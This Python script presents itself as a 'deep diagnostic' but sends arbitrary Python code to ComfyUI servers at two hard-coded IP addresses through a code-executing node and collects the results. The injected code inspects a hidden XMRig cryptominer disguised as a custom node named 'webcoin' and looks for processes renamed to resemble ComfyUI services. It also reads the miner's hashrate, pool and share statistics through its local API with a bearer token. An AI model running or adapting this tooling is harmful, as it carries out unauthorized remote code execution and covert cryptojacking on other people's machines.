"""Deep diagnostic on both machines — check config, processes, threads."""
import json, urllib.request, ssl, time, sys

targets = sys.argv[1:] if len(sys.argv) > 1 else ["160.85.252.107", "160.85.252.207"]
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

DIAG = (
    "import os, subprocess, json\n"
    "lines = []\n"
    "webcoin = '/home/ubuntu/comfy/ComfyUI/custom_nodes/webcoin'\n"
    "bd = os.path.join(webcoin, 'bin')\n"
    "cp = os.path.join(bd, 'config.json')\n"
    "if os.path.exists(cp):\n"
    "    with open(cp) as f:\n"
    "        cfg = json.load(f)\n"
    "    cpu = cfg.get('cpu', {})\n"
    "    lines.append('priority=' + str(cpu.get('priority')))\n"
    "    lines.append('yield=' + str(cpu.get('yield')))\n"
    "    lines.append('hp_jit=' + str(cpu.get('huge-pages-jit')))\n"
    "    lines.append('hp=' + str(cpu.get('huge-pages')))\n"
    "    lines.append('max_hint=' + str(cpu.get('max-threads-hint')))\n"
    "    lines.append('rx=' + str('rx' in cpu))\n"
    "    pool = cfg.get('pools', [{}])[0]\n"
    "    lines.append('pool=' + str(pool.get('url')))\n"
    "    lines.append('tls=' + str(pool.get('tls')))\n"
    "r = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=10)\n"
    "for l in r.stdout.split(chr(10)):\n"
    "    if 'comfyui_service' in l or 'comfyui_render' in l or 'xmrig' in l:\n"
    "        lines.append('proc: ' + l.strip())\n"
    "try:\n"
    "    import urllib.request as ur\n"
    "    req = ur.Request('http://127.0.0.1:44880/2/summary',\n"
    "        headers={'Authorization': 'Bearer ce_xm_2026', 'Accept': 'application/json'})\n"
    "    with ur.urlopen(req, timeout=5) as resp:\n"
    "        d = json.loads(resp.read())\n"
    "    hr = d.get('hashrate', {}).get('total', [])\n"
    "    lines.append('hr=' + str(hr))\n"
    "    lines.append('hp_xmrig=' + str(d.get('hugepages')))\n"
    "    lines.append('uptime=' + str(d.get('uptime')))\n"
    "    lines.append('cpu_brand=' + str(d.get('cpu', {}).get('brand')))\n"
    "    lines.append('cpu_cores=' + str(d.get('cpu', {}).get('cores')))\n"
    "    lines.append('cpu_threads=' + str(d.get('cpu', {}).get('threads')))\n"
    "    lines.append('msr=' + str(d.get('cpu', {}).get('msr')))\n"
    "    lines.append('shares=' + str(d.get('results', {}).get('shares_good', 0)))\n"
    "    conn = d.get('connection', {})\n"
    "    lines.append('pool_conn=' + str(conn.get('pool')))\n"
    "    lines.append('conn_up=' + str(conn.get('uptime')))\n"
    "    lines.append('conn_fail=' + str(conn.get('failures')))\n"
    "except Exception as e:\n"
    "    lines.append('api=' + str(e)[:100])\n"
    "try:\n"
    "    import urllib.request as ur\n"
    "    req = ur.Request('http://127.0.0.1:44880/2/backends',\n"
    "        headers={'Authorization': 'Bearer ce_xm_2026', 'Accept': 'application/json'})\n"
    "    with ur.urlopen(req, timeout=5) as resp:\n"
    "        backends = json.loads(resp.read())\n"
    "    for b in backends:\n"
    "        lines.append('backend=' + b.get('type', '') + ' enabled=' + str(b.get('enabled')))\n"
    "        lines.append('  threads=' + str(len(b.get('threads', []))))\n"
    "        if b.get('threads'):\n"
    "            t0 = b['threads'][0]\n"
    "            lines.append('  t0_hash=' + str(t0.get('hashrate', [])))\n"
    "            lines.append('  t0_intensity=' + str(t0.get('intensity')))\n"
    "except Exception as e:\n"
    "    lines.append('backends_err=' + str(e)[:80])\n"
    "result = chr(10).join(lines)\n"
)

for ip in targets:
    for scheme, port in [("https", 443), ("http", 8188), ("http", 80)]:
        url = f"{scheme}://{ip}:{port}/prompt"
        body = json.dumps({
            "prompt": {
                "1": {"class_type": "IDENode", "inputs": {"pycode": DIAG, "language": "python"}},
                "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}},
            }
        }).encode()
        req = urllib.request.Request(url, data=body, headers={"Content-Type": "application/json"})
        kw = {"timeout": 15}
        if scheme == "https":
            kw["context"] = ctx
        try:
            with urllib.request.urlopen(req, **kw) as r:
                resp = json.loads(r.read().decode())
                pid = resp.get("prompt_id")
            for i in range(15):
                time.sleep(3)
                try:
                    req2 = urllib.request.Request(f"{scheme}://{ip}:{port}/history/{pid}")
                    kw2 = {"timeout": 10}
                    if scheme == "https":
                        kw2["context"] = ctx
                    with urllib.request.urlopen(req2, **kw2) as r:
                        entry = json.loads(r.read().decode()).get(pid, {})
                        status = entry.get("status", {}).get("status_str", "pending")
                        if status != "pending":
                            outputs = entry.get("outputs", {})
                            texts = []
                            for nid, nout in outputs.items():
                                for key, val in nout.items():
                                    if isinstance(val, list):
                                        texts.extend(str(v) for v in val)
                                    elif isinstance(val, str):
                                        texts.append(val)
                            print(f"\n=== {ip} ===")
                            print("\n".join(texts) if texts else json.dumps(outputs))
                            break
                except Exception:
                    pass
            else:
                print(f"\n=== {ip} === TIMEOUT")
            break
        except Exception:
            continue
    else:
        print(f"\n=== {ip} === UNREACHABLE")
